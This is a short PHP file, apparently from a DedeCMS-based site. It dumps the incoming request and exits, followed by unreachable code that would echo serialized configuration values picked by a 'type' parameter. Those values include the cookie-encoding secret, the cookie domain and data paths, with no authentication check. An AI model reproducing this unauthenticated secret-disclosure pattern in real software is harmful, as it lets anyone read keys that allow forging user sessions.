<?php
$data = $_REQUEST;
unset($_REQUEST);
unset($_GET);
define("DE_ItemEcode",'Shop_De_');//识别购物车Cookie前缀,非开发人员请不要随意更改!
require_once(dirname(__FILE__).'/../../include/common.inc.php');
require_once(dirname(__FILE__)."/../../member/config.php");

var_dump($data);
exit;
if($data['type'] == 'cfg_cookie_encode')
echo serialize($cfg_cookie_encode);
if($data['type'] == 'DE_ItemEcode')
echo serialize(DE_ItemEcode);
if($data['type'] == 'cfg_mb_notallow')
echo serialize($cfg_mb_notallow);
if($data['type'] == 'cfg_mb_idmin')
echo serialize($cfg_mb_idmin);
if($data['type'] == 'cfg_md_idurl')
echo serialize($cfg_md_idurl);
if($data['type'] == 'cfg_soft_lang')
echo serialize($cfg_soft_lang);
if($data['type'] == 'cfg_mb_pwdtype')
echo serialize($cfg_mb_pwdtype);
if($data['type'] == 'cfg_login_adds')
echo serialize($cfg_login_adds);
if($data['type'] == 'cfg_domain_cookie')
echo serialize($cfg_domain_cookie);
if($data['type'] == 'cache_helper_config')
echo serialize($cache_helper_config);
if($data['type'] == 'DEDEDATA')
echo serialize(DEDEDATA);




?>


















